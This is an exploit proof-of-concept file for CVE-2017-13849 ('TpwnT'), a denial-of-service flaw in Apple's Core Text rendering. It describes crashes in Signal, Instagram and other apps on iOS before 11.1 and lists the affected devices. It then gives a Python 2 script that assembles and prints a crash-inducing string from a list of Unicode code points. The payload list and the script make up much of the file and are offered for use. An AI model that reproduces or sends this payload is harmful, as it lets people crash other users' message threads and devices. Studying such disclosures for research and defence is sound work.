# Exploit Title: TpwnT - iOS Denail of Service POC
# Date: 10-31-2017
# Exploit Author: Russian Otter (Ro)
# Vendor Homepage: https://support.apple.com/en-us/HT208222
# Version: 2.1
# Tested on: iOS 10.3.2 - 11.1
# CVE: CVE-2017-13849

"""
-------------------------
     CVE-2017-13849
  TpwnT by Ro of SavSec
-------------------------

Description:
	Thread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!

Recorded Tests / Results:
	Signal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.
	
	Instagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.
	
	Pythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.
	
Summary:
	When displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!
	This allows for the possibility of DoS related attacks or application crashing attacks.

Creator: @Russian_Otter (Ro)
Discovery: 7-17-2017
Disclosure: 10-31-2017
Disclosure Page: https://support.apple.com/en-us/HT208222

Affected Devices
	iPhone 5S iOS < 11.1
	iPhone 6 & 6S iOS < 11.1
	iPhone 7 iOS < 11.1
	iPhone 8 iOS < 11.1
	iPhone X iOS < 11.1
	Apple TV 4th Generation
	Apple TV 4K 4th Generation
	iPod Touch 6th Generation
	iPad Air
	watchOS < 4.1
	tvOS < 11.1
	iOS < 11.1

Tested Devices:
	iPhone 5S iOS 10.3.2 - 11.1
	iPhone 6S iOS 10.3.1 - 11.1
	iPad Mini 2 iOS 10.3.2
	Apple TV 2 tvOS 10

Tested Apps:
	Signal
	Instagram
	Snapchat
	Safari
	Tanktastic
	Pythonista 3
	Notepad

"""

tpwnt = "880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634".split()

payload = ""
for i in tpwnt:
	s = unichr(int(i))
	payload += s

payload = bytes(payload)
payload_unicode = unicode(payload)

# Proof of Concept
# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible

if raw_input("Show Payload [y/n] ") == "y":
	print payload_unicode